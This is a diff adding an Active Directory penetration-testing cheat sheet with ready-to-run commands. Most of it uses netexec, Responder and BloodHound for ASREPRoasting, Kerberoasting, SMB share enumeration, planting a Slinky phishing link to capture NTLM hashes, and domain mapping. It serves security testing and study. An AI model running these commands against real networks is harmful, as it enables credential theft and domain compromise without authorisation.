@@ -1,9 +1,175 @@
 # Active-Directory Penetration Testing Process
 
-# Table of contents
+:toc:
+:toclevels: 3
+
+== Table of Contents
+- <<overview,Overview>>
+- <<ports, Port Scanning>>
+- <<creds, Scenario without creds and with creds>>
+- <<ASREPRoast, ASREPRoast>>
+- <<Kerberoasting, Kerberoasting>>
+- <<Smb Shares, Smb>>
+- <<NTLM, NTLM Relay Attack>>
+- <<Bloodhound, Bloodhound>>
+
+[[overview]]
+== Overview
+This CheatList includes basic attacks exists in *Active Directory* enviroment. Possible *attack vectors* and *methonology* , list of *commands* and *tools* with *vectors* , *privilage escalation* , *enumeration* and *others*
+
+[[ports]]
+== Port Scanning
+
+Default *TCP* port scan
+
+```bash
+nmap --top-ports 1000 -sC -sV $target
+```
+
+For more ports and bigger response
+
+```bash
+nmap -p- -sC -sV -oN file.txt $target
+```
+
+Default *UDP* ports scanning 
+
+```bash
+nmap -sU --top-ports 100 -sC -sV $target          
+```
+
+[[creds]]
+== Scenario without creds and with creds
+
+Two scenarios is possible ...
+
+[[ASREPRoast]]
+== ASREPRoast
+
+This `command` returns hash of all users which doesn't have a Kerberos pre-authentication or not required
+
+*Without Auth*
+
+```bash
+nxc ldap $target -u 'username' -p '' --asreproast output.txt
+```
+
+*By wordlist*
+
+If exists dumped or some wordlits of users
+
+```bash
+nxc ldap $target -u user.txt -p '' --asreproast output.txt
+```
+
+*With authentication*
+
+```bash
+nxc ldap $target -u 'username' -p 'password' --asreproast output.txt
+```
+
+If failture named `domain name resolution fail`
+
+```bash
+nxc ldap 192.168.0.104 -u harry -p pass --asreproast output.txt --kdcHost domain_name
+```
+
+More info about https://www.netexec.wiki/ldap-protocol/asreproast[here]
+
+[[Kerberoasting]]
+== Kerberoasting
+
+Kerberoasting is an attack against Active Directory where an attacker requests Kerberos service tickets for service accounts and then cracks them offline to obtain their passwords. It works because the tickets are encrypted with the service account’s password hash, which may be weak or unchanged for long periods.
+
+Also can be done via tool `nxc` netexec
+
+```bash
+nxc ldap $target -u 'username' -p 'username' --kerberoasting output.txt
+```
+
+*Kerberoasting via AS-REP Roasting*
+
+```bash
+nxc ldap $target -u 'username' -p '' --no-preauth-targets kerberoastable.list --kerberoasting output.txt
+```
+
+More info about https://www.netexec.wiki/ldap-protocol/kerberoasting#kerberoasting[here]
+
+[[Smb]]
+== Smb Shares
+
+Enumerate *groups* , *users* via `smb`
+
+```bash
+nxc smb $target -u 'username' -p 'password' --rid # also --rid-brute
+```
+
+Try to *anonymous* log into `shares`, can be putted into username field `guest` with no-pass
+
+```bash
+nxc smb $target -u '' -p '' --shares # guest
+```
+
+*With Auth*
+
+```bash
+smbclient '//$target/$Share'  -U username
+```
+
+*Anonymous*
+
+```bash
+smbclient '//$target/$Share' -N
+```
+
+[[NTLM]]
+== NTLM Relay Attack
+
+If exists *WRITE* permision in the `share` can be crafted a phishing link to catch `hashes` using module in tool `netexec` named *Slinky* 
+
+Also is needed to start `responder` with `sudo` perms in target network
+
+Agaist `tun0` can be anouther, 
+
+```bash
+sudo responder -I tun0
+```
+
+When `responder` started craft `phish-link`
+
+```bash
+nxc smb $target -u 'username' -p 'passwords'  -M slinky -o SHARE=Share  NAME=phish SERVER=$server_in_responder 
+```
+
+[[Bloodhound]]
+== Bloodhound
+
+*BloodHound* with Neo4j is used to *map and analyze* relationships inside an Active Directory environment. By storing AD objects and their connections in a Neo4j graph database, BloodHound helps security teams.*Identify hidden attack paths, privilege escalation routes, and misconfigurations* that could be exploited to gain higher access in the domain.
+
+If port ralated to `ldap` is open can be grabbed info about system , also must be compromised user with valid creds.
+
+```bash
+bloodhound-python -d '$target_domain' -u 'username' -p 'password' -dc '$target_domain_controller' -c all -ns $target_ip
+```
+
+`Bloodhound` cathes an information about *Active Directory* in `.json` files
+
+```bash
+sudo neo4j start    
+```
+
+`neo4j` start database
+
+```bash
+bloodhound-cli  
+```
+
+`bloodhound-cli` starts bloodhound in *cli* , after upload all json files and start analyze
 
 
-## Port scanning
 
 
-## Scenario without creds
+
+
+
+
